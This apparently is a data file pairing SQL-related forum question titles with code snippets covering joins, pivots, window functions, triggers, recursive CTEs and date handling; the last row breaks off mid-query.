3719,29303,Improve query with WHERE clause using same subquery multiple times,"SELECT  scc.intID
        , sci.strName
FROM    tblEPiServerCommunityClub scc
        INNER JOIN tblEPiServerCommunityImageGalleryImage scig ON scig.intImageGalleryID = scc.intImageGalleryID
        INNER JOIN tblEPiServerCommunityImageGallery sci ON sci.intID = scig.intImageGalleryID
WHERE   scig.intID = 123123        
"
33689,45549,Oracle SQL: How to determine total ranking using cursor with IN and OUT params,"Select
    a.userid,
    Sum(decode(a.rank, 'SU', 25, 'EX', 9, 'VG', 5, 'G', 3, 'F',1) * b.tokens)
        / sum(b.tokens) ranking
From
    A
        inner join
    B
        on a.GameID = b.GameID
group by
    a.userid
"
1652,18891,Foreign key -- id or just UNIQUE column,"cookies
{
  id_user(pk, fk), 
  cookie,
  expires
}
"
10419,61106,SELECT all which share an id (of a list of ids) with another entry without using subquery,"SELECT
  DISTINCT
  others.UserID
FROM
  UserProject   AS target
INNER JOIN
  UserProject   AS others
     ON others.ProjectID = target.ProjectID
WHERE
  target.UserID = 1
"
15698,59967,how to query on another query result,"select emp_code, min(emp_name) as emp_name, sum(hours)
from (
  <your original query here>
) as e
group by emp_code
order by emp_name;
"
18821,11798,LINQ to SQL With the where with case statement,"var drs = from DataRow dr in Mytable.Rows
            where   
            (col_Con == 'G' ? col_Val : 30) <= (col_Con == 'L' ? 30 : col_Val)
            select dr;
"
38476,53277,SQL query for dynamic insert row,"INSERT YourTable (ItemCode, Attribute, PositionID)
SELECT t.ItemCode, 'SECOND ATTRIBUTE', 2
FROM 
(
SELECT ItemCode
FROM YourTable
GROUP BY ItemCode
HAVING COUNT(*) = 1
) t
"
10557,8258,sqlserver - combine multiple rows into one rows by using pivot,"WITH cte 
     AS (SELECT id, 
                value, 
                col_name 
         FROM   yourtable 
                CROSS apply( VALUES (total_amount,'Type' + type + '_Total'), 
                                    (average_amount,'Type' + type + '_Avg') ) 
             CS (value, col_name)) 
SELECT * 
FROM   cte 
       PIVOT (Max(value) 
             FOR col_name IN([TypeA_total],[TypeB_total],[TypeC_total], 
                             [TypeA_avg],[TypeB_avg],[TypeC_avg]))pv 
"
35159,23049,"Compare 2 tables and add missing records to the first, taking into account year/months","select fd.fulldate, c.D_ACTIECODE
from (select distinct fulldate from fact_quantity_tmp) fd cross join
     (select D_ACTIECODE from C_DS_BD_AP_A) c left join
     fact_quantity_tmp fqt
     on fqt.fulldate = fd.fulldate and fqt.dim03 = c.D_ACTIECODE
where fqt.fulldate is null;
"
9024,17247,"SQL Using to_char(null), to_number(null), etc in set operators with Oracle","SELECT e.employee_id ""Employees with Dependents"",
  e.first_name,
  e.last_name,
  d.birthdate ""Dependent Birthdate""
FROM employees e join
     dependents d
     on d.relative_id = e.employee_id
"
3055,53963,.NET query of Access database misinterprets dd/mm/yyyy date literal as mm/dd/yyyy,"Dim dd As Date 
dd = datetimepicker.value
qrytxt = ""select * from table where [Date] = #"" + dd.ToString(""yyyy'/'MM'/'dd"") + ""#""
"
1030,62182,SQL: Trying to understand IF/ELSE,"with myChoices (choices)
as (
    select
        choices
    from (
        values
        ('ITUNES'),
        ('SFR'),
        ('ORANGE'),
        ('Others')
    ) [ ] (choices)
),
myQuery ([source],[Volume],[Value])
as (
    SELECT CASE r.SourceId
                        WHEN '1' THEN 'ITUNES' 
                        WHEN '2' THEN 'SFR'
                        WHEN '3' THEN 'ORANGE' 
                        ELSE 'Others'
                        END as source 
    , CAST(SUM (r.SalesVolume) AS DECIMAL(14, 4) ) AS Volume
    , CAST(SUM (r.SalesVolume * r.CustomerPrice) AS DECIMAL(14, 4) ) AS Value 
    from Rawdata r 
    INNER JOIN Product p
        ON p.ProductId = r.ProductId
    INNER JOIN Calendar c 
        ON r.DayId = c.DayId
        WHERE c.WeekId BETWEEN (20145227) AND (20155230)
        AND p.ContentFlavor IN ('SD', 'HD')
        AND p.VODEST IN ('VOD','EST')
        AND p.Distributor IN ('M6SND')
        GROUP BY  CASE r.SourceId
            WHEN '1' THEN 'ITUNES' 
            WHEN '2' THEN 'SFR'
            WHEN '3' THEN 'ORANGE' 
            ELSE 'Others'
            END
)
select
    c.choices,
    ISNULL(q.Volume,0)Volume,
    ISNULL(q.Value,0)Value
from myChoices c 
left join myQuery q on
    c.choices = q.[source]
"
35620,6433,Return the last sub sorted row in a table (sql),"SELECT y, Max(x) FROM [table] group by Y
"
10097,25672,sql have function,"SELECT first_name, COUNT(link.job_id) 
FROM employee, job, link 
WHERE  job.job_id = link.job_id 
AND employee.employee_id = link.employee_id
AND job.job_id IN (SELECT job_id FROM link GROUP BY job_id HAVING COUNT(*) > 1) 
GROUP BY first_name 
HAVING (COUNT(link.job_id) > 1 ) ;
"
1028,52676,Mysql multi join with count,"select tag, count(*)
from product_tags
where product_id in
(
  select product_id
  from products_to_categories
  where category_id = 68
  or category_id in
  (
    select category_id
    from categories
    where parent_id = 68
  )
)
group by tag
order by count(*) desc;
"
17845,41603,It is possible to do a autonumber sequence in a SELECT on Oracle?,"select 
  rownum
from 
  dba_objects, 
  dba_objects
where
  rownum <= 9000;
"
37692,20577,SQL IfNull() function doesn't recognize null strings,"selectItem = connection.prepareStatement(""SELECT Location, ItemType ""
            + ""FROM DBTEST ""
            + ""WHERE Location = IFNULL(?,Location)"");
if (NameVar == null) {
    selectItem.setNull(1, Types.VARCHAR);
}
else {
    selectItem.setString(1, NameVar);
}
"
28138,9723,Create packages in SQL Server management studio without SSIS,"CREATE SCHEMA [billing]

CREATE PROCEDURE billing.sp_IssueInvoice ( /*parameters*/ )
AS
BEGIN
    -- Your code
END

CREATE PROCEDURE billing.sp_CancelInvoice ( /*parameters*/ )
AS
BEGIN
    -- Your code
END

CREATE SCHEMA [ordering]

CREATE PROCEDURE ordering.sp_SubmitOrder ( /*parameters*/ )
AS
BEGIN
    -- Your code
END

CREATE PROCEDURE ordering.sp_UpdateOrder ( /*parameters*/ )
AS
BEGIN
    -- Your code
END
"
18203,36984,"Complicated SQL query performance issue (group by, case statement)","FROM notification n LEFT JOIN user u 
   ON n.category <> ""category1"" AND n.from_id = u.user_id
WHERE
to_uid = 20
"
15485,5719,Find most recent distinct records and sort by created_at in Postgresql,"select *
from (
    select distinct on (conversation_id) *
    from messages
    order by conversation_id, id desc
) t
order by id desc
"
3353,7663,Calculate percents inline in SQL query,"SELECT R1.user, COUNT(*)/R2.COUNT_ALL AS Expr1
  FROM Releases R1,
       (SELECT COUNT(*) As COUNT_ALL FROM Releases WHERE Release = '1.0') R2
 WHERE R1.Release = '1.0'
 GROUP BY R1.user, R2.COUNT_ALL
"
29004,45362,return multiple data from stored procedure from the same table,"        SELECT @UserId = UserId ,
               @IsVerify = IsVerify ,
               @UserType = UserType ,
              @IsPremium = IsPremium 
        FROM Users WHERE Email = @Email AND Password = @Password
"
29494,40063,check condition in table definition,"create unique index on tab (isdefault)
where isdefault ;
"
38207,10595,Is it viable to translate a table with view?,"create view v_table as
     select col1 as col_1, col2 as col_2
     from table t;
"
10053,48162,"SQL query on multiple tables, one being a junction table","SELECT DISTINCT USERS.user_name, MESSAGES.message
FROM GROUP_MATRIX
JOIN USERS on GROUP_MATRIX.userID = USERS.userID
JOIN MESSAGES on GROUP_MATRIX.userID = MESSAGES.userID;
"
13202,18157,SQL relations between blog and author,"Create table Author
(
Id int
, Name nvarchar(max)
);

Create table Image
(
Id int
,ImagePath nvarchar(max)
);

Create table Blog
(
Id int
,Name nvarchar(max)
,AuthorId int
);

Create table BlogImages
(
Id int
,BlogId int
,ImageId int
);

ALTER TABLE Blog
ADD FOREIGN KEY (AuthorId)
REFERENCES Author(Id);

ALTER TABLE BlogImages
ADD FOREIGN KEY (BlogId)
REFERENCES Blog(Id);

ALTER TABLE BlogImages
ADD FOREIGN KEY (ImageId)
REFERENCES Image(Id);
"
27015,5611,MySQL Include a script within script,"# -- foo.sql
DROP TABLE foo;
source bar.sql

# -- bar.sql
CREATE TABLE bar (i INT NOT NULL);

$ mysql ... < foo.sql
"
5451,15573,How to retrieve and use row(s) from database in HTML page?,"declare
  ...
begin
  for i in (select text_col, rownum from mytable) loop
    htp.p(apex_item.text(rownum, text_col) || '<br>');
  end loop;
end;
"
39424,52988,How to combine multiple count statements in SQL," SELECT 
    -- Status,
    sum(case when Status = 'Homeworker' then 1 else 0 end) StatusHW,
    sum(case when Status = 'Home Based' then 1 else 0 end) StatusHB,
    sum(case when Status = 'PIP' then 1 else 0 end) StatusPIP,
    sum(case when Status = 'TBC' then 1 else 0 end) StatusTBC
    FROM HomeworkerStatus
    -- GROUP BY Status
"
32564,60528,SQL Server using a sequence in conjunction with union selects,"WITH source (SomeColumn) AS
(
          SELECT 'some value 1'
    UNION SELECT 'some value 2'
)
SELECT ROW_NUMBER() OVER (ORDER BY (SELECT NULL)), SomeColumn FROM source;
"
27737,65598,Oracle FOR LOOP Query,"SQL> declare
  2    type num_arr is table of number;
  3    l_ids num_arr := num_arr( 10, 200, 30, 32, 5444, 6 );
  4  begin
  5    for i in 1 .. l_ids.count
  6    loop
  7      dbms_output.put_line( l_ids(i) );
  8    end loop;
  9  end;
 10  /
10
200
30
32
5444
6
"
13690,15857,SharePoint 2013 - Programmatically access the file in directory from the path present in database table,"using (var site = new SPSite(""http://devspace/sites/Tester""))
        {
            using (var web = site.OpenWeb())
            {
                var list = web.Lists.TryGetList(""Test List"");

                if (list != null)
                {
                    var item = list.Items[0];
                    using (var fs = new FileStream(@""C:\TEmp\compass.jpg"", FileMode.Open, FileAccess.Read))
                    {
                        byte[] fileData = new byte[fs.Length];
                        fs.Read(fileData, 0, System.Convert.ToInt32(fs.Length));
                        fs.Close();

                        item.Attachments.Add(""Compass.jpg"", fileData);
                        item.Update();
                    }
                }
            }
        }
"
30350,50359,String.Join in SQL,"DECLARE @Codes VARCHAR(8000) 
SELECT @Codes = COALESCE(@Codes + ', ': '') +  tdefSymptomCode.SymptomCodeNumber
    FROM  RMA INNER JOIN
        trelRMA_SymptomCode ON RMA.IdRMA = trelRMA_SymptomCode.fiRMA INNER JOIN
        tdefSymptomCode ON trelRMA_SymptomCode.fiSymptomCode = tdefSymptomCode.idSymptomCode
    where idRMA=2
    order by SymptomCodeNumber
return @Codes
"
6022,47583,Issue with joining,"SELECT a.AuditoriumName,
     COUNT( distinct d.StudentID) as Total_Visits 
                          from Auditorium a
     INNER JOIN AudiReservation c ON a.AudiID=c.AudiID
     INNER JOIN OrderHistory d on c.OrderID=d.OrderID
GROUP BY a.AudiID;
"
30453,46062,How to write a MySQL Join query,"SELECT u.uid, u.city, u.username, u.flag 
FROM users u
JOIN groupmember g ON u.uid = g.uid
WHERE u.city = 'Tokyo'
  AND g.groupid = 16;
"
26437,21055,How can I select all users who have a collection of permissions and not one specific permission SQL?,"SELECT u.Username
FROM UserPermission up JOIN
     UserAccount ua
     ON ua.UserID = up.UserId JOIN
     Permission p
     ON p.PermissionId = up.PermissionId
GROUP BY up.UserId,u.Username
HAVING SUM(CASE WHEN p.name = 'p1' THEN 1 ELSE 0 END) > 0 AND
       SUM(CASE WHEN p.name = 'p2' THEN 1 ELSE 0 END) > 0 AND
       SUM(CASE WHEN p.name IN ('p3', 'p4') THEN 1 ELSE 0 END) = 0;
"
22183,28920,Creating ON INSERT trigger on Oracle table,"CREATE OR REPLACE TRIGGER tri_check_nulls
  BEFORE INSERT ON TABLE1
  FOR EACH ROW WHEN (new.CODE is NULL)
DECLARE
    VIEW_CODE   INTEGER;
BEGIN

    VIEW_CODE := TO_NUMBER(SUBSTR(new.COMMENT, INSTR(new.COMMENT, '-', -1, 1) + 1));

    select distinct v.CODE, v.PARTNER, v.COUNTRY
        into  :new.CODE, :new.PARTNER, :new.COUNTRY
        from VIEW1 v
        where v.CODE = VIEW_CODE;

END;
/
"
10924,75061,Please help me out for the following scenario,"select all_people from call_centerDB where called_nos=92222 OR called_nos=122323 OR called_nos=9988898
"
16481,26629,SQL joining tables only on specific rows,"select t1.parameters,
  t1.value,
  case when t2.mammal is null then '' else t2.mammal end Mammal
from table1 t1
left join table2 t2
  on t1.value = t2.animal
"
38058,59595,How can I return the value of a specific attribute in an XML column for all rows in a SQL Server table?,"SELECT
   (list of other columns),
   XmlColumn.value('(/Document/@ID)[1]', 'int') AS 'DocumentID'
FROM
   dbo.YourTable
"
18913,7752,how to import excel.cvs file without an index key to phpmyadmin,"ALTER TABLE t AUTO_INCREMENT = <number_of_rows+1>;
"
22463,67729,"SQL query, who visited in the past year","select * from visit
where DATE_visit between
CURRENT_DATE - interval 2 year and CURRENT_DATE - interval 1 year;
"
7029,41325,Representing Id's based on a prefix Microsoft SQL Server 2008,"SELECT 
  Id,
  CoId,
  PartnerCoId,
  mc.Prefix as coPrefix,
  pc.Prifix as partnerPrefix
FROM Table t
JOIN PrefixTable mc
  ON t.CoId = mc.CoId
JOIN PrefixTable pc
  ON t.PartnerCoId = pc.CoId
"
14786,49246,SQL: First Occuerence and with value,"select personId,incident,MIN(convert(date,date)) as date
from [table]
group by personId,incident
"
20731,66009,Can I create an alias name for a subquery so I can use the alias in other subqueries?,"select
  x.date_allocated,
  x.component_part,
  x.qty_required,
  x.running_demand_UK,
  x.onhand_UK,
  x.running_demand_UK - x.onhand_UK as running_stock_UK
from
    (select distinct 

      trunc(al.date_required) date_allocated, 
      al.component_part, al.qty_required, 

      sum(al.qty_required) over (
            partition by al.component_part 
            order by trunc(al.date_required), al.component_part) running_demand_UK,

      (select sum(pl.qty_onhand) from part_loc pl 
       where al.component_part = pl.part_no 
            and pl.plant in ('W','2') 
            and pl.location_type = 'IN') onhand_UK

    from allocations al, part_description pd

    where al.alloc_plant = 'W'
        and al.status_code between '4' and '8'
        and al.component_part like 'Y%'
        and al.component_part = 'Y450569'
        and al.component_part = pd.part_no
        and substr(pd.prodtyp,1,2) in ('JC','KT','TR') ) x
order by 
  x.component_part, 
  x.date_allocated
"
26750,43226,how to get full outer join in left and right join order,"SELECT *
FROM   @table1 a
       FULL OUTER JOIN @table2 b
         ON a.col1 = b.col2
ORDER  BY Isnull(col1, col2) 
"
10899,14251,Counting occurrences of duplicates in multiples fields in SQL,"SELECT T.AgentID, count(*) as BadCalls
FROM CallRecords as T
INNER JOIN CallRecords as H
ON
  T.RouterCallKey = H.RouterCallKey
  AND T.PeripheralCallKey = H.PeripheralCallKey
  AND H.SequenceNumber > T.SequenceNumber
WHERE
  T.CallDisposition = 'Transfer'
  AND H.CallDisposition = 'Handled'
  AND T.SequenceNumber = 1
  AND T.AgentID <> H.AgentID
GROUP BY
  T.AgentID
"
2857,13504,add auto_increment to an existing db,"ALTER TABLE [TableName] DROP COLUMN ID 
ALTER TABLE [TableName] ADD ID INT IDENTITY(1,1)
"
28607,34542,"Optimization of 'GROUP BY'-Query, eliminate 'Using where; Using temporary; Using filesort'","INDEX newindex (check_id, probe_id, internal, datetime_day, step_id, value_of_interest)
"
13398,21474,SQL Join and show results if join false,"SELECT  wc.comment, wc.comment_by_name, wc.user_id, u.url 
FROM    comments wc
        LEFT JOIN users u 
           on wc.wag_uid = u.user_id
WHERE id = '1237' 
GROUP BY wc.comment 
ORDER BY wc.dateadded DESC
"
18867,13588,use output of SQL statement as the table to run a query on,"DECLARE @MyDynamicQuery VARCHAR(MAX)
DECLARE @MyDynamicDBName VARCHAR(20)

SELECT @MyDynamicDBName = dbName 
FROM DB1.dbo.table1

SET @MyDynamicQuery = 'SELECT value1 FROM ' + @MyDynamicDBName + '.dbo.desiredTable'

EXEC(@MyDynamicQuery)
"
18011,17681,Set-based alternative to loops in SQL,"SELECT W.DocumentId, SUM(W.Weight*Q.Weight) As Score
FROM TfidfWeights AS W
INNER JOIN Query AS Q ON W.StemId = Q.StemId
GROUP BY W.DocumentId
"
13142,14060,Select table and replace column by value from another table,"SELECT id,
       (SELECT Max(code)
        FROM   table2),
       name
FROM   table1 A
WHERE  code = (SELECT Max(code) code
               FROM   table1) 
"
3133,2972,Cross-join issue in SQL statement (SAS),"select a.period_start,
       (select count(*)
        from all_periods b
        where b.period_start < a.period_start
       ) as result
from all_periods a;
"
31230,7778,Getting MIN Price in Subquery in SQL Server (using DISTINCT)?,"SELECT 
       datepart(year,[Registration]) AS YearRegistered, 
       MIN(SalePrice), Model, Make
FROM 
       [VehicleSales] 
GROUP BY 
       datepart(year,[Registration]), Model, Make
"
13116,2556,Help for a mysql query/procedure,"SELECT team1_result INTO var_team1_result FROM results_table;
SELECT team1_result INTO var_team1_result FROM results_table;

IF var_team1_result > var_team2_result THEN
  UPDATE score_table SET team1_point = team1_point + 3 where [];
ELSE
  UPDATE score_table SET team1_point = team1_point + 1 where [];
END IF;
"
25077,18408,Query SQL Linked Server only pulling data from one server,"exec sp_dropserver 'dbs';
exec sp_addlinkedserver 'dbs';
"
9412,58926,Obtaining data from either table based on condition,"SELECT T1.Col1 AS country, T1.Col2 AS airline FROM Table1 T1
WHERE T1.Col1 NOT IN(
   SELECT T2.Col1 FROM Table2 T2)
UNION ALL
SELECT T2.Col1 AS country, T2.Col2 AS airline FROM Table2 T2
"
27585,7677,How to find specific records between two date date,"   select * 
    from ( select Name, 
                  Log, 
                  rank() over (partition by Name order by Date asc) ranks 
            from Table 
            WHERE Date BETWEEN @DateBegin AND @DateEnd     
    ) alias 
     where ranks = 1
"
13699,12573,SQL Server : multiple rows with same column values except one,"SELECT name_text,c_num,d_type,unique_id,v_text,r_ticket_id
FROM
    (
        SELECT  name_text, c_num, d_type, unique_id, v_text, r_ticket_id,
                ROW_NUMBER() OVER (PARTITION BY unique_id 
                                   ORDER BY r_ticket_id DESC) rn
        FROM tableName
    ) x
WHERE x.rn = 1
"
17261,24626,How to get intro record from each group,"SELECT MIN(id) id, group, name
FROM TABLE1
GROUP BY group
ORDER BY group
"
27421,28668,SQL: Join table a and b then join table c to get the results that are on a but not on c?,"select a.Username, a.Userid, b.Roleid 
from NewTable a 
join RoleTable b 
on a.UserID=b.UserID 
where 
    b.RoleID = 2
    AND
    NOT EXISTS
        (select * 
        from OldTable AS c
        where c.UserManager = 1 
            and 
            c.Authorized = 1 
            and 
            c.Status = 'A'
            AND
            a.userid = c.userid)
"
17506,74473,Converting MM-DD-YYYY varchar to datetime,"UPDATE mytable
SET temp_date = STR_TO_DATE(varchar_date, '%m-%d-%Y')
"
36161,63382,SQL Select 'n' records without a Table,"DECLARE @start INT = 1;
DECLARE @end INT = 10;

WITH numbers AS (
    SELECT @start AS number
    UNION ALL
    SELECT number + 1 
    FROM  numbers
    WHERE number < @end
)
SELECT *
FROM numbers
OPTION (MAXRECURSION 0);
"
8768,8959,How Do I Update a Table From Another Table Only If the Result Count is 1?,"UPDATE import_hourly_event_reports i
   SET i.banner_id = b.banner_id
  FROM banner b
  JOIN plan p ON b.plan_id = p.id
 WHERE b.campain_id = i.campaign_id
   AND b.size_id = i.size_id
   AND p.site_id = i.site_id
   AND (SELECT COUNT(b1.banner_id)
          FROM banner b1
          JOIN plans p1 ON b1.plan_id = p1.id
         WHERE b1.campain_id = i.campaign_id
           AND b1.size_id = i.size_id
           AND p1.site_id = i.site_id) = 1
"
2400,72754,Left Join query with flag condition,"SELECT c.cash_id, c.cash_name,
       COALESCE(ca.cashassignment_id, 'Unallocated') AS cashassignment_id
FROM cash c LEFT JOIN
     cash_assignments ca
     ON c.cash_id = ca.cash_id AND ca.cashassignment_valid = TRUE ;
"
6887,721,putting data into categories (buckets) based on a value,"with x as (
    select CountOfSA, 
    width_bucket(CountOfSA, 1, 200, 40) bucket_
    from NR_CF_212
    )
select CountOfSA, 
       cast(1 + (bucket_ - 1)*5 as varchar2(4)) ||
       '-' ||
       cast( bucket_*5 as varchar2(4)) diff
from x
order by CountOfSA;
"
30955,29148,Retrieving only rows for which a join has a dependancy,"SELECT DISTINCT
        TestID,
        TestName
    FROM
        `Users` AS u
    RIGHT JOIN
        `Users_have_Tests` AS ut
        ON
            u.UserID = ut.UserID
    LEFT JOIN
        `Tests` AS t
        ON
            ut.TestID = t.TestID
    WHERE TestID NOT IN (SELECT TestID
                         FROM TestResults
                         Where Percentage = 100)
    GROUP BY UserID
"
30941,26085,How do I insert a simple value to a BLOB field using the INSERT INTO statement?,"INSERT INTO A(name, file) VALUES('abcvdfdfas', BINARY 'whatever');
"
10809,18681,Sql Not In in Linq Issue,"int[] tmp=new int[]{1,2,6,8,9,10};

var query=from d in dc_tp_tprocess
          join pd in dc_tp_tprocedured on d.processid equals pd.processid into leftGroup1
          from pd in leftGroup1.DefaultIfEmpty() 
          join t in dc_tp_test on pd.procedureid equals t.procedureid into leftGroup2
          from t in leftGroup2.DefaultIfEmpty()
          orderby t.testid,d.processid
          where d.active==""Y"" && t.testid==1 && !tmp.Contains(d.processid)
          select new {d.processid,d.name,test_name=t==null?"""":t.test_name};
"
38924,72600,mysql select data from multiple rows,"SELECT * FROM TABLE WHERE keyword = 'guy' AND name in (SELECT name FROM TABLE WHERE keyword = 'developer')
"
30861,51257,MySQL IF Condition in a Calculated Field,"SELECT ....
  case when consumer_expert_id = 1 then 1 else -1 end as my
  from consumer_expert_score
 where consumer_expert_score_id IN (2,1)
"
3094,19701,MySQL - Where clause for Date Comparison,"select count(*) from sl_list 
where type = 'pantry'
and date(create_dtime) <> date(mod_dtime)
"
25529,31103,How to select dates within a range in MySQL?,"SELECT *
FROM example
WHERE PERIOD_DIFF(date_format(now(), '%Y%m', date_format(date, '%Y%m')) <= 5
"
28403,6996,Order grouped values differently in SQL Server,"convert(Date, a.DATECREATED,101), source_of_data
"
30331,62658,Selecting Stored Procedure Value in Query in MySQL,"drop procedure if exists sp_test;

delimiter #

create procedure sp_test(
in p_facility_id int unsigned, -- p prefix = parameter
in p_start_date date,
in p_end_date date
)
begin

declare v_facility_name varchar(255) default null; -- v prefix = variable

select f.facility_name into v_facility_name from facilities f where
 f.facility_id = p_facility_id limit 1;

select f.*, upper(v_facility_name) as facility_name from facilities f;

end#

delimiter ;

call sp_test (1, curdate() - interval 1 month, curdate());
"
32994,20274,SQL query groupBy and filter,"SELECT u.id, u.email
FROM users u
WHERE EXISTS (
  SELECT 1
  FROM searches s
  WHERE s.user_id = u.id
    AND s.browser <> 'Internet Explorer'
)
"
10404,17821,Open XML Insert in Temp table - SQL 2005,"DECLARE @test XML
    SET @test = '<Products><ProductId>1</ProductId><ProductId>2</ProductId></Products>'

DECLARE @Temp TABLE(ProductId NVARCHAR(10))  

DECLARE @docHandle int 
EXEC sp_xml_preparedocument @docHandle OUTPUT, @doc 

INSERT INTO @Temp(ProductId)
     SELECT t.value('./ProductId[1]','NVARCHAR(10)') AS 'ProductId'
       FROM OPENXML(@docHandle, '//Products', 1) t

EXEC sp_xml_removedocument @docHandle
"
27284,58836,How to determine the hostname in Oracle APEX?,"function call                    |  result
---------------------------------|-----------------------------------
APEX_UTIL.HOST_URL()             |  http://example.com:5883
APEX_UTIL.HOST_URL('SCRIPT')     |  http://example.com:5883/pls/apex/
APEX_UTIL.HOST_URL('IMGPRE')     |  http://example.com:5883/i/
"
13524,15019,Query to retrieve Text data type column value based on MAX value in other column,"with c as(
  select FldId, Rev, Words
    , row_number() over (partitioned by FldId order by Rev desc) as rn
  from table)
select FldId, Rev, Words 
from c
where rn =1;
"
13584,8411,"SQL ORDER BY two columns, whichever is higher","ORDER BY GREATEST(num_sold, num_views)
"
29829,55368,Generating DDL script for object without schema name baked in using DBMS_METADATA.GET_DDL?,"DBMS_METADATA.SET_REMAP_PARAM(th,'REMAP_SCHEMA','HR',NULL);
"
20076,42935,DB2 SQL Query not considering spaces in field's data,"WHERE VAR_DATA = 'I' AND LENGTH(VAR_DATA) = 2
"
19461,42313,I want to do a UNION with two SELECTS and put inside a table,"FROM (SELECT * FROM Mail.dbo.CheckMe
WHERE Value = '120' OR Value = '220'
UNION
SELECT * FROM Mail.dbo.CheckMeTwo
WHERE Value = '120' OR Value = '220') T
"
34900,20700,Update Column with Composite Referenced Value SQL Server 2008,"UPDATE table1
SET   email = LEFT (FirstName,1) + LastName + '@company.com'
WHERE email IS NULL
"
27917,25053,Need to Convert Binary to NVARCHAR IN SQL Server 2008,"DECLARE @varbinaryField VARBINARY(max);
SET @varbinaryField = 0x358C0F85A2DB47C9AC06FD392466EF0B

SELECT CONVERT(NVARCHAR(max), @varbinaryField, 2)
"
32906,3315,How to optimize query for optional input id (either one specific row or whole table),"WHERE NVL(p_optional_id_node, n.id) = n.id
"
35290,50210,Where Exists returning all rows,"select * from patient
where exists
(
    select p.patientid 
    from tblclaims as c 
    inner join patient as p on p.patientid=c.patientid
        and p.admissiondate = c.admissiondate
        and p.dischargedate = c.dischargedate
    where patient.patientid = p.patientid
    group by p.patientid
    having count(*)>500
)
"
9769,62696,Oracle output in sqlplus,"SET serververoutput ON;
"
21273,15668,Complex query: find all users who rated at least 2 common movies rated by u1,"SELECT R.uid from ratings R
JOIN
(SELECT distinct mid  
 FROM ratings 
 WHERE uid='u1') T
ON R.mid = T.mid
group by R.uid
having count(R.mid) = 2;

+-----+
| uid |
+-----+
| u1  |
| u3  |
+-----+
2 rows in set (0.15 sec)
"
34600,68559,how to group an ID field and select rows having highest value in another field PostgreSQL,"select distinct on (productid) 
    gtab04.product,
    productid,
    gtab05.mrp,
    gtab05.ptr,
    gtab05.ssr,
    patent
from
    gtab05
    inner join
    gtab07 using(patentid)
    inner join
    gtab04 using(productid)
where qty-iqty > 0
order by productid, gtab05.mrp desc
"
32086,27012,taking a very efficient join between two tables in Oracle,"SELECT *
FROM Post p
JOIN (SELECT *
      FROM Comment
      WHERE comment_creation_date > ? and comment_creation_date < ?
              AND 'stringlist' LIKE '%'||comment_type||'%'
     )c
ON c.post_id = p.post_id
"
36650,16817,What is MYSQL equivalent for DATABASENAME..TABLENAME?,"SELECT * FROM DatabaseName.TableName
"
22964,65811,"SSIS, Importing multiple datasets from one CSV file","    public void Main()
    {
        // TODO: Add your code here            
        System.IO.StreamWriter outfile = null;
        string line=null;
        string inputfile = Dts.Variables[""SourceFiles""].Value.ToString();
        var infile = new System.IO.StreamReader(inputfile);
        string outpath = Dts.Variables[""DetailFiles""].Value.ToString();
        int CounterPart = (int)Dts.Variables[""CounterPart""].Value;
        outpath = string.Format(outpath, CounterPart++);
        outfile = new System.IO.StreamWriter(outpath);

        while (line != ""Detail"") {
            line = infile.ReadLine();
                    }

        while (!infile.EndOfStream)
        {
            line = infile.ReadLine();
            outfile.WriteLine(line);
        }

        outfile.Dispose();
        infile.Dispose();

        Dts.Variables[""DataFile""].Value=outpath;
        Dts.Variables[""CounterPart""].Value = CounterPart;

        Dts.TaskResult = (int)ScriptResults.Success;
    }
}
"
13023,40721,Finding unmatched records with SQL,"SELECT
    *
FROM
    Table2 T2
WHERE
    NOT EXISTS (SELECT *
        FROM
           Table1 T1
        WHERE
           T1.State = T2.State AND
           T1.Product = T2.Product AND
           T1.Distributor = 'X')
"
3734,21901,Creating a view with LEFT and INNER JOIN,"SELECT *
FROM ContractHeader CH
    INNER JOIN ContractStatus CS ON CH.ContractStatusID = CS.ContractStatusID
    LEFT JOIN Contacts CON ON CH.ContactID = CON.ContactID
    LEFT JOIN (
        SELECT * FROM ContractLineItem CLI
        INNER JOIN ContractLineItemStatus CLIS ON CLI.ContractLineItemStatusID = CLIS.ContractLineStatusID
    ) AS CLI_AND_S ON CH.ContractID = CLI_AND_S.ContractID
"
20361,63340,How to solve this with correct query in SQL Server 2008,"select EMP_ID, MONTH,
max( case when Year=2013 then Sal else null end) as Sal_2013, 
max( case when Year=2014 then Sal else null end) as Sal_2014, 
max( case when Year=2013 then TA else null end) as TA_2013, 
max( case when Year=2014 then TA else null end) as TA_2014, 
max( case when Year=2013 then DA else null end) as DA_2013, 
max( case when Year=2014 then DA else null end) as DA_2014
from  table1
group by EMP_ID, MONTH
"
1871,72919,Select a column with condition with other column as it is,"SELECT id, emp_id, emp_name
     , first_value(emp_location) OVER (PARTITION BY emp_id
                                       ORDER BY date DESC) AS emp_location
     , date, sales
FROM   user_sale
ORDER  BY id;
"
32663,7026,"SQL - WHERE (X, Y) IN (A, B)","SELECT Table.*
FROM Table
    INNER JOIN Criteria ON Table.X = Criteria.X AND Table.Y = Criteria.Y
"
15400,50432,"SQL to retrieve parent-child relationship in parent-child order, from a self referencing table","WITH ChildLocations(LocationId, FkParentLocationId, [Level]) 
    AS 
    (
        (
            -- Start CTE off by selecting the home location of the user
            SELECT l.LocationId, l.FkParentLocationId, 0 as [Level],
                   cast( str( l.locationId ) as varchar(max) ) as orderField
            FROM   Location l
            WHERE  l.LocationId = @locationId
        )
        UNION ALL 
        -- Recursively add locations that are children ...
        SELECT l2.LocationId, l2.FkParentLocationId, [Level] + 1,
               tmp.orderField + '-' + 
               str(tmp.locationId) as orderField
        FROM   ChildLocations tmp
               INNER JOIN Location l2
                    ON  l2.FkParentLocationId = tmp.LocationId
    )
SELECT * from ChildLocations order by orderField;
"
6470,1005,how to make mysql sub query,"select count(*) as UserInYear from UserLoginTable_201307 where UserID=1
union all
select count(*) from UserLoginTable_201306 where UserID=1
"
25908,17224,SQL Need Inner Join,"select
  t2.ID, t1.CompId
from Tbl1 t1
join Tbl2 t2 on t1.CommaList
  like '%''' + cast(t2.ClientId as varchar(10)) + '''%'
"
6589,42002,UPDATE and return some rows twice,"with list(name) as (
    select first_name 
    from table1 
    where first_name is not null and ready=false
    union all
    select last_name 
    from table1 
    where last_name is not null and ready=false
), u as (
    update table1
    set ready = true
    where
        (first_name is not null or last_name is not null)
        and
        not ready
)
select * from list
"
10059,13474,SQL: Select new columns based on group order,"select 
    *, 
    case when date = MIN(date) over (partition by groupid order by groupid) then 'TRUE' else 'FALSE' end isFirst,
    case when date = MAX(date) over (partition by groupid order by groupid) then 'TRUE' else 'FALSE' end isLast,
    count(*) over (partition by groupid order by groupid) Channelsingroup,
